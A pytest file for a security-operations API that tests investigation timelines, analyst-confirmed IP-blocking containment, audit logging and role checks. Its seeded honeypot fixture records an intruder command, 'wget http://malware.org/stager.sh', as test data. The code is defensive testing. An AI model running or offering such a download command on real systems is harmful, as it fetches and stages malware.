import json
import datetime
import pytest
from fastapi.testclient import TestClient

from app.main import app
from app.database import SessionLocal
from app.models import Investigation, InvestigationNote, HoneypotEvent, Alert, ThreatIntelIOC, AuditLog
from app.security import create_access_token

client = TestClient(app)

@pytest.fixture
def auth_headers():
    token = create_access_token(data={"sub": "admin", "role": "admin"})
    return {"Authorization": f"Bearer {token}"}

@pytest.fixture
def analyst_headers():
    token = create_access_token(data={"sub": "analyst", "role": "analyst"})
    return {"Authorization": f"Bearer {token}"}

@pytest.fixture
def viewer_headers():
    token = create_access_token(data={"sub": "viewer", "role": "viewer"})
    return {"Authorization": f"Bearer {token}"}

def test_investigation_timeline_retrieval(auth_headers):
    db = SessionLocal()
    try:
        now = datetime.datetime.utcnow()
        # Seed 2 events
        ev1 = HoneypotEvent(
            eventid="cowrie.login.failed",
            timestamp=now - datetime.timedelta(minutes=10),
            src_ip="198.51.100.22",
            dst_port=22,
            protocol="SSH",
            username="root",
            password="password123",
            duration=3.2,
            country="United States",
            country_code="US",
            severity="medium",
            is_simulated=False,
            data_source="cowrie"
        )
        ev2 = HoneypotEvent(
            eventid="cowrie.command.input",
            timestamp=now - datetime.timedelta(minutes=5),
            src_ip="198.51.100.22",
            dst_port=22,
            protocol="SSH",
            command="wget http://malware.org/stager.sh",
            duration=15.0,
            country="United States",
            country_code="US",
            severity="critical",
            is_simulated=False,
            data_source="cowrie"
        )
        db.add_all([ev1, ev2])
        db.commit()
        db.refresh(ev1)
        db.refresh(ev2)

        # Create investigation
        inv = Investigation(
            title="Correlated Attack Campaign: 198.51.100.22",
            description="Multi-stage intruder session with brute force and dropper execution.",
            severity="critical",
            status="open",
            risk_score=85.0,
            asset_tier="Critical Gateway",
            created_at=now,
            updated_at=now,
            related_events=json.dumps([ev1.id, ev2.id])
        )
        db.add(inv)
        db.commit()
        db.refresh(inv)

        # Create linked alert
        alert = Alert(
            timestamp=now - datetime.timedelta(minutes=5),
            title="Suspicious Ingress Binary Download",
            severity="critical",
            rule_name="Suspicious Ingress Binary Download",
            src_ip="198.51.100.22",
            status="active",
            risk_score=85.0,
            incident_id=inv.id,
            evidence=json.dumps({"triggering_event_id": ev2.id})
        )
        db.add(alert)
        db.commit()

        # Query timeline
        resp = client.get(f"/api/v1/investigations/{inv.id}/timeline", headers=auth_headers)
        assert resp.status_code == 200
        data = resp.json()
        assert data["investigation_id"] == inv.id
        assert data["total_events"] == 2
        assert len(data["timeline"]) == 2
        assert data["timeline"][0]["id"] == ev1.id
        assert data["timeline"][1]["id"] == ev2.id
        assert "Suspicious Ingress Binary Download" in data["timeline"][1]["matched_alerts"]
        assert len(data["associated_alerts"]) >= 1
        assert len(data["correlation_factors"]) >= 2
    finally:
        db.close()

def test_containment_action_requires_confirmation(analyst_headers):
    db = SessionLocal()
    try:
        inv = Investigation(
            title="Test Case Requiring Containment",
            severity="high",
            status="open",
            created_at=datetime.datetime.utcnow(),
            updated_at=datetime.datetime.utcnow()
        )
        db.add(inv)
        db.commit()
        db.refresh(inv)

        # Attempt containment with confirmed=False
        resp = client.post(
            f"/api/v1/investigations/{inv.id}/containment",
            json={
                "action": "BLOCK_IP",
                "confirmed": False,
                "target": "203.0.113.88",
                "reason": "Test"
            },
            headers=analyst_headers
        )
        assert resp.status_code == 400
        assert "explicit analyst confirmation" in resp.json()["detail"]
    finally:
        db.close()

def test_containment_action_execution_and_audit(analyst_headers):
    db = SessionLocal()
    try:
        inv = Investigation(
            title="Active Intrusion Case",
            severity="critical",
            status="open",
            created_at=datetime.datetime.utcnow(),
            updated_at=datetime.datetime.utcnow()
        )
        db.add(inv)
        db.commit()
        db.refresh(inv)

        target_ip = "198.51.100.99"
        # Execute containment with confirmed=True
        resp = client.post(
            f"/api/v1/investigations/{inv.id}/containment",
            json={
                "action": "BLOCK_IP",
                "confirmed": True,
                "target": target_ip,
                "reason": "Repeated C2 stager download attempts"
            },
            headers=analyst_headers
        )
        assert resp.status_code == 200
        res_data = resp.json()
        assert res_data["success"] is True
        assert res_data["action"] == "BLOCK_IP"
        assert res_data["target"] == target_ip

        # Verify threat intel IOC was recorded
        ioc = db.query(ThreatIntelIOC).filter(ThreatIntelIOC.indicator == target_ip).first()
        assert ioc is not None
        assert ioc.threat_score == 100
        assert "Perimeter Blocklist" in ioc.category

        # Verify audit log was created
        audit = db.query(AuditLog).filter(AuditLog.action == "CONTAINMENT_ACTION_EXECUTED").order_by(AuditLog.id.desc()).first()
        assert audit is not None
        assert target_ip in audit.details

        # Verify investigation note was added
        note = db.query(InvestigationNote).filter(InvestigationNote.investigation_id == inv.id).first()
        assert note is not None
        assert "[CONTAINMENT ENFORCED]" in note.note_text
    finally:
        db.close()

def test_containment_action_rbac_rejection(viewer_headers):
    resp = client.post(
        "/api/v1/investigations/1/containment",
        json={
            "action": "BLOCK_IP",
            "confirmed": True,
            "target": "198.51.100.1"
        },
        headers=viewer_headers
    )
    assert resp.status_code == 403
